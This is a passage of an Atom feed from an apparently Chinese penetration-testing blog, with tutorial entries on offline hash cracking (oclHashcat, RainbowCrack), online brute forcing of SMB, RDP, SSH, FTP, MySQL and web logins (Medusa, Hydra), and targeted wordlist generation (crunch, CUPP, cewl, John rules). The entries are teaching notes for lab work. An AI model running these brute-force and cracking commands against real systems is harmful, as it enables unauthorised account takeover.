      <category term="kali" scheme="http://c.cat.plus/tags/kali/"/>
    
      <category term="hashid" scheme="http://c.cat.plus/tags/hashid/"/>
    
      <category term="hash‐identifier" scheme="http://c.cat.plus/tags/hash%E2%80%90identifier/"/>
    
      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
    
      <category term="hashcat" scheme="http://c.cat.plus/tags/hashcat/"/>
    
      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>oclhashcat基于GPU密码破解及彩虹表破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/oclhashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/oclhashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-23T09:55:23.000Z</published>
    <updated>2020-05-25T07:48:23.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="oclhashcat-离线密码破解"><a href="#oclhashcat-离线密码破解" class="headerlink" title="oclhashcat  离线密码破解"></a><strong>oclhashcat</strong>  离线密码破解</h3><p>号称世界上最快、唯一的基于GPGPU的密码破解软件<br>免费开源、支持多平台、支持分布式、150+hash算法 </p></blockquote><p><strong>硬件支持</strong></p><ul><li>虚拟机中无法使用</li><li>支持 CUDA 技术的Nvidia显卡</li><li>支持 OpenCL 技术的AMD显卡</li><li>安装相应的驱动 </li></ul><p><strong>限制</strong></p><ul><li>最大密码长度 55 字符</li><li>使用Unicode的最大密码长度 27 字符</li></ul><p><strong>关于版本</strong><br>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a><strong>命令</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</span><br><span class="line"></span><br><span class="line">?l &#x3D; abcdefghijklmnopqrstuvwxyz</span><br><span class="line">?u &#x3D; ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">?d &#x3D; 0123456789</span><br><span class="line">?s &#x3D;  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~</span><br><span class="line">?a &#x3D; ?l?u?d?s</span><br><span class="line">?b &#x3D; 0x00 - 0xff</span><br></pre></td></tr></table></figure><blockquote><h3 id="RainbowCrack-彩虹表离线密码破解"><a href="#RainbowCrack-彩虹表离线密码破解" class="headerlink" title="RainbowCrack 彩虹表离线密码破解"></a><strong>RainbowCrack</strong> 彩虹表离线密码破解</h3></blockquote><p>基于时间记忆权衡技术生成彩虹表<br>提前计算密码的HASH值,通过比对HASH值破解密码<br>计算HASH的速度很慢,修改版支持CUDA GPU<br>    <code>https://www.freerainbowtables.com/en/download/</code></p><h4 id="KALI-中包含的RainbowCrack工具"><a href="#KALI-中包含的RainbowCrack工具" class="headerlink" title="KALI 中包含的RainbowCrack工具"></a><strong>KALI 中包含的RainbowCrack工具</strong></h4><ul><li>rtgen：预计算，生成彩虹表，耗时的阶段</li><li>rtsort：对rtgen生成的彩虹表进行排序</li><li>rcrack：查找彩虹表破解密码 </li><li>以上命令必须顺序使用</li></ul><h4 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a><strong>彩虹表</strong></h4><ul><li>密码明文、HASH值、HASH算法、字符集、明文长度范围 </li></ul><h5 id="rtgen"><a href="#rtgen" class="headerlink" title="rtgen"></a><code>rtgen</code></h5><p>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160<br><code>rtgen md5 loweralpha 1 5 0 10000 10000 0</code><br>计算彩虹表时间可能很长 </p><p><strong>下载彩虹表</strong><br><code>http://www.freerainbowtables.com/en/tables/</code><br><code>http://rainbowtables.shmoo.com/</code></p><h5 id="彩虹表排序"><a href="#彩虹表排序" class="headerlink" title="彩虹表排序"></a><strong>彩虹表排序</strong></h5><pre><code>/usr/share/rainbowcrackrtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</code></pre><h5 id="彩虹表密码破解"><a href="#彩虹表密码破解" class="headerlink" title="彩虹表密码破解"></a><strong>彩虹表密码破解</strong></h5><pre><code>rcrack *.rt-h 5d41402abc4b2a76b9719d911017c592rcrack *.rt-l hash.txt</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;oclhashcat-离线密码破解&quot;&gt;&lt;a href=&quot;#oclhashcat-离线密码破解&quot; class=&quot;headerlink&quot; title=&quot;oclhashcat  离线密码破解&quot;&gt;&lt;/a&gt;&lt;strong&gt;oclhashcat&lt;/s
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="hashcat" scheme="http://c.cat.plus/tags/hashcat/"/>
    
      <category term="彩虹表" scheme="http://c.cat.plus/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/"/>
    
      <category term="GPU" scheme="http://c.cat.plus/tags/GPU/"/>
    
      <category term="RainbowCrack" scheme="http://c.cat.plus/tags/RainbowCrack/"/>
    
  </entry>
  
  <entry>
    <title>Medusa在线密码破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-22T22:05:13.000Z</published>
    <updated>2020-05-25T07:47:50.498Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hydra 的缺点</p></blockquote><ul><li>稳定性差，程序时常崩溃</li><li>速度控制不好，容易触发服务屏蔽或锁死机制</li><li>每主机新建进程，每服务新建实例</li><li>大量目标破解时性能差</li></ul><blockquote><p>Medusa 的特点</p></blockquote><ul><li>稳定性好</li><li>速度控制得当</li><li>基于线程</li><li>支持模块少于hydra(不支持RDP)</li><li>WEB-Form支持存在缺陷</li></ul><h4 id="medusa支持破解的模块"><a href="#medusa支持破解的模块" class="headerlink" title="medusa支持破解的模块"></a><strong>medusa支持破解的模块</strong></h4><pre><code>medusa -d </code></pre><h4 id="medusa破解windows密码"><a href="#medusa破解windows密码" class="headerlink" title="medusa破解windows密码"></a><strong>medusa破解windows密码</strong></h4><pre><code>medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></pre><h4 id="medusa破解Linux-SSH密码"><a href="#medusa破解Linux-SSH密码" class="headerlink" title="medusa破解Linux SSH密码"></a><strong>medusa破解Linux SSH密码</strong></h4><pre><code>medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>medusa -M ftp -h 1.1.1.1 -e ns -F -u ftp -P password.lstmedusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -Fmedusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;-n：非默认端口-s：使用SSL连接-T：并发主机数 medusa -M ftp -q</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Hydra 的缺点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;稳定性差，程序时常崩溃&lt;/li&gt;
&lt;li&gt;速度控制不好，容易触发服务屏蔽或锁死机制&lt;/li&gt;
&lt;li&gt;每主机新建进程，每服务新建实例&lt;/li&gt;
&lt;li&gt;大量目标破解时性能差&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="medusa" scheme="http://c.cat.plus/tags/medusa/"/>
    
  </entry>
  
  <entry>
    <title>hydra在线密码破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-22T19:15:23.000Z</published>
    <updated>2020-05-25T07:44:13.738Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a><strong>Hydra</strong></h3></blockquote><ul><li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li></ul><h4 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a><strong>Windows密码破解</strong></h4><pre><code>hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVdhydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></pre><h4 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a><strong>Linux密码破解</strong></h4><pre><code>hydra -l root -P pass.lst ssh://1.1.1.1 -t 1 -vV</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></pre><h4 id="hydra图形化界面"><a href="#hydra图形化界面" class="headerlink" title="hydra图形化界面"></a><strong>hydra图形化界面</strong></h4><pre><code>xhydra</code></pre><h4 id="HTTP表单身份认证"><a href="#HTTP表单身份认证" class="headerlink" title="HTTP表单身份认证"></a><strong>HTTP表单身份认证</strong></h4><pre><code>hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vhydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:Login Failed&quot; -V    #失败/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:FooC:先访问指定页面取得cookieH:指定http头https-post-form、http-get-form、https-get-form-S：使用SSL连接</code></pre><h4 id="pw-inspector-hydra软件包附带工具"><a href="#pw-inspector-hydra软件包附带工具" class="headerlink" title="pw-inspector hydra软件包附带工具"></a><strong>pw-inspector</strong> hydra软件包附带工具</h4><p>按长度和字符集筛选字典</p><pre><code>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></pre><h4 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a><strong>密码破解效率</strong></h4><ul><li>密码复杂度(字典命中率)</li><li>带宽、协议、服务器性能、客户端性能</li><li>锁定阈值</li><li>单位时间最大登陆请求次数</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Hydra&quot;&gt;&lt;a href=&quot;#Hydra&quot; class=&quot;headerlink&quot; title=&quot;Hydra&quot;&gt;&lt;/a&gt;&lt;strong&gt;Hydra&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;九头蛇，砍去一个
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="Linux密码破解" scheme="http://c.cat.plus/tags/Linux%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="hydra" scheme="http://c.cat.plus/tags/hydra/"/>
    
      <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>密码破解方法及Crunch字典生成工具</title>
    <link href="http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</id>
    <published>2015-05-21T09:05:17.000Z</published>
    <updated>2020-05-25T07:41:37.778Z</updated>
    
    <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h3><p>目标系统实施了强安全措施</p><ul><li>安装了所有补丁 </li><li>无任何已知漏洞 </li><li>无应用层漏洞 </li><li>攻击面最小化<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4>获取目标系统用户身份 </li><li>非授权用户不受信，认证用户可以访问守信资源 </li><li>已有用户账号权限受限，需要提权 </li><li>不会触发系统报警</li></ul><h4 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a><strong>身份认证方法</strong></h4><ul><li>证明你是你声称你是的那个人</li><li>你知道什么（账号密码、pin、passphrase） </li><li>你有什么（令牌、token、key、证书、密宝、手机）</li><li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别） </li><li>以上方法结合使用（多因素身份认证）<br>基于互联网的身份验证仍以账号密码为主要形式</li></ul><blockquote><h3 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a><strong>密码破解方法</strong></h3></blockquote><h4 id="人工猜解"><a href="#人工猜解" class="headerlink" title="人工猜解"></a><strong>人工猜解</strong></h4><ul><li>垃圾桶工程</li><li>被动信息收集 <h4 id="基于字典暴力破解（主流）"><a href="#基于字典暴力破解（主流）" class="headerlink" title="基于字典暴力破解（主流）"></a>基于字典暴力破解（主流）</h4><h4 id="键盘空间字符暴破"><a href="#键盘空间字符暴破" class="headerlink" title="键盘空间字符暴破"></a>键盘空间字符暴破</h4></li></ul><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li>保存有用户名和密码的文本文件 </li><li>/usr/share/wordlist </li><li>/usr/share/wfuzz/wordlist </li><li>/usr/share/seclists</li></ul><blockquote><h3 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a><strong>字典</strong></h3></blockquote><h4 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h4><ul><li>全键盘空间字符</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ul><h4 id="crunch-创建字典"><a href="#crunch-创建字典" class="headerlink" title="crunch 创建字典"></a><strong>crunch 创建字典</strong></h4><pre><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]&lt;charset string&gt; 默认是小写字符crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100-b 按大小分割字典文件(kb/kib、mb/mib、gb/gib)-c 每个字典的行数以上两个参数必须与-o START 结合使用-d 同一字符连贯出现数量(11 / aaa)</code></pre><h4 id="使用字符集"><a href="#使用字符集" class="headerlink" title="使用字符集"></a><strong>使用字符集</strong></h4><p><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></p><h4 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a><strong>无重复字符</strong></h4><p><code>crunch 1 1 -p 1234567890 | more</code><br>    必须是最后一个参数<br>    最大、最小字符长度失效，但必须存在<br>    与-s 参数不兼容（-s 指定起始字符串）<br><code>crunch 4 4 0123456789 -s 9990</code></p><ul><li>读取文件中每行内容作为基本字符生成字典<br><code>crunch 1 1 -q read</code></li></ul><h4 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a><strong>字典组成规则</strong></h4><pre><code>crunch 6 6 -t @,%%^^ | more</code></pre><ul><li>@：小写字母 lalpha</li><li>,：大写字母 ualpha</li><li>%：数字 numeric</li><li>^：符号 symbols<h4 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a><strong>输出文件压缩</strong></h4>  <code>crunch 4 4 -t @,%^ -o 1.txt -z 7z</code><br>   其他压缩格式：gzip、bzip2、lzma<br>   7z压缩比率最大</li></ul><p><strong>Use example:</strong></p><pre><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalphanumeric-all-space -o w.txt -t @d@@ -s cdabcrunch 4 5 -p dog cat birdcrunch 5 5 abc DEF + \!@# -t ,@^%,    + 占位符    \ 转义符(空格、符号)crunch 5 5 -t ddd%% -p dog cat bird    任何不同于-p 参数指定的值都是占位符crunch 5 5 -d 2@ -t @@@%%组合破解工具应用 crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd</code></pre><h4 id="按个人信息生成其专属的密码字典"><a href="#按个人信息生成其专属的密码字典" class="headerlink" title="按个人信息生成其专属的密码字典"></a><strong>按个人信息生成其专属的密码字典</strong></h4><p><strong>CUPP：Common User Password Profiler</strong><br>    git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a><br>    python cup.py -i</p><p>通过收集网站信息生成字典<br>    cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt<br>    -m：最小单词长度<br>    -e：收集包含email地址信息<br>    -c：每个单词出现次数<br>    支持基本、摘要 身份认证<br>    支持代理<br><strong>用户密码变型</strong></p><ul><li>基于 cewl 的结果进行密码变型 </li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换 </li><li>字母与数字互相转换 </li><li>P@$$w0rd</li></ul><p><strong>使用 John the Ripper 配置文件实现密码动态变型</strong><br>    /etc/john/john.conf<br>    [List.Rules:Wordlist]<br>    $[0-9]$[0-9]$[0-9]<br>    john –wordlist=cewl.txt –rules –stdout &gt; m.txt</p><pre><code>[List.Rules:test]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&amp;*()\-_=+]john --wordlist=cewl.txt --rules=test --stdout &gt; m.txtjohn --wordlist=ahm.lst --rules=test HASHFILE</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;&lt;strong&gt;思路&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;目标系统实施了强安全措施&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装了所有补丁 &lt;/li&gt;
&lt;li&gt;无任何已知漏洞 &lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="Wordlist" scheme="http://c.cat.plus/tags/Wordlist/"/>
    
      <category term="crunch" scheme="http://c.cat.plus/tags/crunch/"/>
    
  </entry>
  
</feed>
